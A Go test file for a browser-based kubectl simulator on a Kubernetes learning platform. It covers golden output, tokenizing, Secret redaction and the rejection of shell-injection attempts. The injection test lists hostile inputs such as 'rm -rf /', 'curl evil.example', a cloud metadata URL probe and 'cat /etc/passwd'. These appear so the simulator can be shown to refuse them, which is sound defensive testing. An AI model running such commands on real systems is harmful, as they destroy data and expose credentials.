package kubectl

import (
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"go.yaml.in/yaml/v3"

	"github.com/kubedojolearn/kubedojo/apps/api/internal/simulator"
)

var update = flag.Bool("update", false, "rewrite golden files")

// extraResources extend the nginx fixture so every printer and error path has something to show.
const extraResources = `[
 {"apiVersion":"v1","kind":"Service","metadata":{"name":"web","namespace":"default","labels":{"app":"nginx"}},
  "spec":{"selector":{"app":"nginx"},"ports":[{"port":80,"targetPort":80}]},"ageSeconds":3000},
 {"apiVersion":"v1","kind":"Service","metadata":{"name":"web-np","namespace":"default"},
  "spec":{"type":"NodePort","selector":{"app":"nginx"},"ports":[{"name":"http","port":80,"targetPort":80}]},"ageSeconds":2000},
 {"apiVersion":"v1","kind":"ConfigMap","metadata":{"name":"app-config","namespace":"default"},"data":{"mode":"prod","level":"debug"},"ageSeconds":7200},
 {"apiVersion":"v1","kind":"Secret","metadata":{"name":"db-creds","namespace":"default"},"stringData":{"password":"training-only"},"ageSeconds":7200},
 {"apiVersion":"v1","kind":"Namespace","metadata":{"name":"shop"},"ageSeconds":90000},
 {"apiVersion":"apps/v1","kind":"Deployment","metadata":{"name":"orders","namespace":"shop","labels":{"app":"orders"}},
  "spec":{"replicas":2,"selector":{"matchLabels":{"app":"orders"}},"template":{"metadata":{"labels":{"app":"orders"}},
  "spec":{"containers":[{"name":"orders","image":"kubedojo/orders:1.0","env":[{"name":"MODE","valueFrom":{"configMapKeyRef":{"name":"orders-config","key":"mode","optional":true}}}],
  "resources":{"requests":{"cpu":"50m","memory":"32Mi"}}}]}}},"ageSeconds":600},
 {"apiVersion":"v1","kind":"Pod","metadata":{"name":"typo","namespace":"default","labels":{"run":"typo"}},
  "spec":{"containers":[{"name":"web","image":"ngnix:1.27"}]},"ageSeconds":300},
 {"apiVersion":"v1","kind":"Pod","metadata":{"name":"picky","namespace":"default"},
  "spec":{"nodeSelector":{"disktype":"ssd"},"containers":[{"name":"web","image":"nginx:1.27"}]},"ageSeconds":120}
]`

func testEnv(t *testing.T) Env {
	t.Helper()
	raw, err := os.ReadFile("../../../../content/fixtures/nginx-one-replica.yaml")
	if err != nil {
		t.Fatal(err)
	}
	var v any
	if err := yaml.Unmarshal(raw, &v); err != nil {
		t.Fatal(err)
	}
	j, _ := json.Marshal(v)
	var fx simulator.Fixture
	if err := json.Unmarshal(j, &fx); err != nil {
		t.Fatal(err)
	}
	var extra []json.RawMessage
	if err := json.Unmarshal([]byte(extraResources), &extra); err != nil {
		t.Fatal(err)
	}
	fx.Resources = append(fx.Resources, extra...)
	fx.ImageCatalog = []simulator.ImageProfile{{
		Image: "kubedojo/orders:1.0", Behavior: "crash", ExitCode: 1, RequiresEnv: []string{"MODE"},
		Logs: []string{"orders 1.0 starting", "fatal: MODE is not set"},
	}}
	st, err := simulator.Load(fx, 7)
	if err != nil {
		t.Fatal(err)
	}
	// Events from loading are what the lab has stored; the state starts with none of its own.
	events := append([]simulator.Event{}, st.Events()...)
	restored := simulator.NewState(st.Now, st.Gen.Seed, st.Images)
	if err := restored.Restore(st.All()); err != nil {
		t.Fatal(err)
	}
	restored.Gen, restored.Revision, restored.CurrentNamespace = st.Gen, st.Revision, st.CurrentNamespace
	return Env{State: restored, Events: events}
}

type fingerprint struct {
	revision int64
	now      time.Time
	counter  uint64
	events   int
	objects  string
}

func fingerprintOf(t *testing.T, st *simulator.State) fingerprint {
	b, err := json.Marshal(st.All())
	if err != nil {
		t.Fatal(err)
	}
	return fingerprint{st.Revision, st.Now, st.Gen.Counter, len(st.Events()), string(b)}
}

// goldenCommands cover every read command, aliases, namespaces, selectors, output formats and
// the error paths learners hit most.
var goldenCommands = []string{
	"kubectl get pods",
	"kubectl get pods -o wide",
	"kubectl get po -A",
	"k get pods --show-labels",
	"kubectl get pods --no-headers",
	"kubectl get pods --sort-by=metadata.creationTimestamp",
	"kubectl get pods -l app=nginx",
	"kubectl get pods -l 'app in (nginx,web)'",
	"kubectl get pods -l app=nope",
	"kubectl get pods -l 'app in nginx'",
	"kubectl get pods -n shop",
	"kubectl -n shop get pods",
	"kubectl get pods --namespace=nope",
	"kubectl get pod nope",
	"kubectl get pod nope -n nope",
	"kubectl get pods typo picky nope",
	"kubectl get pods -o name",
	"kubectl get pod typo -o yaml",
	"kubectl get pods -l run=typo -o json",
	"kubectl get deploy",
	"kubectl get deployments.apps -o wide",
	"kubectl get deployment nginx -o yaml",
	"kubectl get rs -A",
	"kubectl get svc",
	"kubectl get services -o wide",
	"kubectl get ns",
	"kubectl get nodes",
	"kubectl get no -o wide",
	"kubectl get cm",
	"kubectl get secrets",
	"kubectl get secret db-creds -o yaml",
	"kubectl get endpointslices",
	"kubectl get ep",
	"kubectl get events",
	"kubectl get ev -A",
	"kubectl get all",
	"kubectl get all -A",
	"kubectl get deploy,svc",
	"kubectl get deploy/nginx svc/web",
	"kubectl get pods -A typo",
	"kubectl get",
	"kubectl get foo",
	"kubectl get statefulsets",
	"kubectl get pods -o jsonpath='{.items}'",
	"kubectl get pods -o bogus",
	"kubectl get pods -w",
	"kubectl get pods --context=prod",
	"kubectl get pods --frobnicate",
	"kubectl get pods -Z",
	"kubectl get pods -n",
	"kubectl get pods 'naïve-☃'",
	"kubectl describe pod nginx",
	"kubectl describe pod typo",
	"kubectl describe pod picky",
	"kubectl describe pods -n shop",
	"kubectl describe deploy nginx",
	"kubectl describe deployment orders -n shop",
	"kubectl describe rs",
	"kubectl describe svc web-np",
	"kubectl describe node node-2",
	"kubectl describe ns shop",
	"kubectl describe cm app-config",
	"kubectl describe secret db-creds",
	"kubectl describe endpointslices",
	"kubectl describe ep web",
	"kubectl describe pod nope",
	"kubectl describe",
	"kubectl logs deployment/nginx",
	"kubectl logs deploy/orders -n shop",
	"kubectl logs deploy/orders -n shop --previous",
	"kubectl logs deploy/orders -n shop --tail=1",
	"kubectl logs deploy/nginx --previous",
	"kubectl logs typo",
	"kubectl logs picky",
	"kubectl logs nope",
	"kubectl logs deploy/nginx -f",
	"kubectl logs svc/web",
	"kubectl logs",
	"kubectl events",
	"kubectl events -A --types=Warning",
	"kubectl events --for deployment/nginx",
	"kubectl events -n nope",
	"kubectl explain pods",
	"kubectl explain deploy.spec.replicas",
	"kubectl explain deployments.apps.spec.strategy",
	"kubectl explain svc.spec --recursive",
	"kubectl explain pod.spec.volumes",
	"kubectl explain pod.spec.nope",
	"kubectl api-resources",
	"kubectl api-resources --namespaced=false",
	"kubectl api-resources -o name",
	"kubectl api-versions",
	"kubectl cluster-info",
	"kubectl cluster-info dump",
	"kubectl version",
	"kubectl version -o json",
	"kubectl config view",
	"kubectl config get-contexts",
	"kubectl config current-context",
	"kubectl config use-context prod",
	"kubectl rollout status deploy/nginx",
	"kubectl rollout status deployment orders -n shop",
	"kubectl rollout history deployment/nginx",
	"kubectl rollout history deployment/nginx --revision=1",
	"kubectl rollout status svc/web",
	"kubectl rollout undo deploy/nginx",
	"help",
	"kubectl",
	"kubectl get --help",
	"kubectl help logs",
	"clear",
	"",
	"kubectl scale deploy nginx --replicas=3",
	"kubectl exec -it typo -- sh",
	"kubectl port-forward svc/web 8080:80",
	"kubectl frobnicate",
	"sh -c ls",
	"helm install x",
	"kubectl get pods; rm -rf /",
}

var goldenName = regexp.MustCompile(`[^a-z0-9]+`)

func goldenFile(i int, cmd string) string {
	name := strings.Trim(goldenName.ReplaceAllString(strings.ToLower(cmd), "-"), "-")
	if name == "" {
		name = "empty"
	}
	if len(name) > 60 {
		name = name[:60]
	}
	return filepath.Join("testdata", "golden", fmt.Sprintf("%03d-%s.txt", i, name))
}

func render(cmd string, r Result) string {
	var b strings.Builder
	fmt.Fprintf(&b, "$ %s\n", cmd)
	fmt.Fprintf(&b, "--- exit %d", r.ExitCode)
	if r.ErrorCode != "" {
		fmt.Fprintf(&b, " (%s)", r.ErrorCode)
	}
	if r.Clear {
		b.WriteString(" [clear]")
	}
	b.WriteString("\n--- stdout\n")
	b.WriteString(r.Stdout)
	b.WriteString("--- stderr\n")
	b.WriteString(r.Stderr)
	return b.String()
}

func TestGolden(t *testing.T) {
	env := testEnv(t)
	before := fingerprintOf(t, env.State)
	if *update {
		_ = os.RemoveAll(filepath.Join("testdata", "golden"))
		if err := os.MkdirAll(filepath.Join("testdata", "golden"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for i, cmd := range goldenCommands {
		got := render(cmd, Execute(cmd, env))
		path := goldenFile(i, cmd)
		if *update {
			if err := os.WriteFile(path, []byte(got), 0o600); err != nil {
				t.Fatal(err)
			}
			continue
		}
		want, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("%s: %v (run go test ./internal/kubectl -update)", cmd, err)
		}
		if got != string(want) {
			t.Errorf("%s: output differs from %s\n--- got\n%s\n--- want\n%s", cmd, path, got, want)
		}
		// Read-only commands never change anything, including the clock (ADR-0006).
		if after := fingerprintOf(t, env.State); after != before {
			t.Fatalf("%q changed the simulated cluster", cmd)
		}
	}
}

func TestDeterministicOutput(t *testing.T) {
	for _, cmd := range []string{"kubectl get all -A -o yaml", "kubectl describe nodes", "kubectl get events -A"} {
		a, b := Execute(cmd, testEnv(t)), Execute(cmd, testEnv(t))
		if a.Stdout != b.Stdout || a.Stderr != b.Stderr {
			t.Fatalf("%s: output differs between identical labs", cmd)
		}
	}
}

func TestTokenizer(t *testing.T) {
	ok := map[string][]string{
		`kubectl get pods`:                   {"kubectl", "get", "pods"},
		`  kubectl   get	pods  `:             {"kubectl", "get", "pods"},
		`kubectl get pods -l 'app in (a,b)'`: {"kubectl", "get", "pods", "-l", "app in (a,b)"},
		`kubectl get pods -l "tier!=web"`:    {"kubectl", "get", "pods", "-l", "tier!=web"},
		`kubectl get pod my\ pod`:            {"kubectl", "get", "pod", "my pod"},
		`kubectl get pod "say \"hi\""`:       {"kubectl", "get", "pod", `say "hi"`},
		`kubectl get pod ''`:                 {"kubectl", "get", "pod", ""},
		`kubectl get pod 'a;b|c&d>e<f$(g)'`:  {"kubectl", "get", "pod", "a;b|c&d>e<f$(g)"},
		`kubectl get pod a"b"'c'`:            {"kubectl", "get", "pod", "abc"},
		`kubectl get pods -l 'emoji=☃'`:      {"kubectl", "get", "pods", "-l", "emoji=☃"},
	}
	for in, want := range ok {
		got, f := Tokenize(in)
		if f != nil {
			t.Errorf("%q rejected: %s", in, f.Message)
			continue
		}
		if strings.Join(got, "\x00") != strings.Join(want, "\x00") || len(got) != len(want) {
			t.Errorf("%q → %q, want %q", in, got, want)
		}
	}
}

// Injection attempts are rejected before anything is parsed or run, with a non-zero exit.
func TestShellSyntaxIsNeverExecuted(t *testing.T) {
	attempts := []string{
		"kubectl get pods; rm -rf /",
		"kubectl get pods && curl evil.example",
		"kubectl get pods || true",
		"kubectl get pods | grep nginx",
		"kubectl get pods > /etc/passwd",
		"kubectl get pods >> out.txt",
		"kubectl get pods < input",
		"kubectl get pods $(whoami)",
		"kubectl get pods `whoami`",
		"kubectl get pods \"$(whoami)\"",
		"kubectl get pods \"`id`\"",
		"kubectl get pods $HOME",
		"kubectl get pods ${HOME}",
		"kubectl get pods &",
		"kubectl get pods\nrm -rf /",
		"kubectl get pods\r\nwhoami",
		"kubectl get pods \x00",
		"kubectl get pods \x1b[31m",
		"kubectl get pods (subshell)",
		"kubectl get pods 'unterminated",
		"kubectl get pods \"unterminated",
		"kubectl get pods \\",
		"bash -c 'kubectl get pods'",
		"sh",
		"/bin/sh",
		"curl http://169.254.169.254/",
		"cat /etc/passwd",
		"docker ps",
		"helm list",
		"eval kubectl get pods",
		"exec kubectl get pods",
		"KUBECONFIG=/x kubectl get pods",
		"kubectl" + strings.Repeat(" get", 70),
		"kubectl get pods " + strings.Repeat("a", MaxInputBytes),
		"kubectl get pods \xff\xfe",
	}
	env := testEnv(t)
	before := fingerprintOf(t, env.State)
	for _, in := range attempts {
		r := Execute(in, env)
		if r.ExitCode == 0 || r.ErrorCode == "" || r.Stdout != "" {
			t.Errorf("%q was not rejected: exit=%d code=%q stdout=%q", in, r.ExitCode, r.ErrorCode, r.Stdout)
		}
		if r.ErrorCode != CodeUnsupported && r.ErrorCode != CodeValidation {
			t.Errorf("%q: unexpected code %q", in, r.ErrorCode)
		}
	}
	if fingerprintOf(t, env.State) != before {
		t.Fatal("a rejected command changed state")
	}
}

func TestSecretValuesAreRedactedInHistory(t *testing.T) {
	env := testEnv(t)
	for _, cmd := range []string{"kubectl get secret db-creds -o yaml", "kubectl get secrets -o json", "kubectl get all,secrets -o yaml"} {
		r := Execute(cmd, env)
		encoded := "dHJhaW5pbmctb25seQ==" // base64("training-only")
		if !strings.Contains(r.Stdout, encoded) {
			t.Fatalf("%s: the learner should see their Secret's data", cmd)
		}
		if strings.Contains(r.Redacted, encoded) || !strings.Contains(r.Redacted, "<redacted>") {
			t.Fatalf("%s: stored output keeps the Secret value:\n%s", cmd, r.Redacted)
		}
	}
	if r := Execute("kubectl describe secret db-creds", env); strings.Contains(r.Stdout, "training-only") {
		t.Fatal("describe printed a Secret value")
	}
}

func TestPlanClassifiesMutations(t *testing.T) {
	for in, mutating := range map[string]bool{
		"kubectl get pods": false,
		"kubectl -n shop scale deploy x --replicas=2": true,
		"kubectl apply -f manifests/web.yaml":         true,
		"kubectl delete pod x":                        true,
		"kubectl describe pod x":                      false,
		"kubectl get pods; kubectl delete pod":        false, // rejected, never mutating
	} {
		if got := Plan(in).Mutating; got != mutating {
			t.Errorf("%q: mutating=%v", in, got)
		}
	}
}

func TestParsedRecordsStructure(t *testing.T) {
	r := Execute("kubectl get pods -n shop -l app=orders -o wide", testEnv(t))
	p := r.Parsed
	if p == nil || p.Verb != "get" || p.Namespace != "shop" || p.Selector != "app=orders" || p.Output != "wide" ||
		len(p.Resources) != 1 || p.Resources[0] != "Pod" {
		t.Fatalf("parsed %+v", p)
	}
}

func TestHumanDuration(t *testing.T) {
	cases := map[time.Duration]string{
		0: "0s", 59 * time.Second: "59s", 119 * time.Second: "119s", 2 * time.Minute: "2m", 150 * time.Second: "2m30s",
		10 * time.Minute: "10m", 3 * time.Hour: "3h", 3*time.Hour + 20*time.Minute: "3h20m", 10 * time.Hour: "10h",
		50 * time.Hour: "2d2h", 10 * 24 * time.Hour: "10d", 3 * 365 * 24 * time.Hour: "3y",
	}
	for d, want := range cases {
		if got := humanDuration(d); got != want {
			t.Errorf("%v: %s, want %s", d, got, want)
		}
	}
}
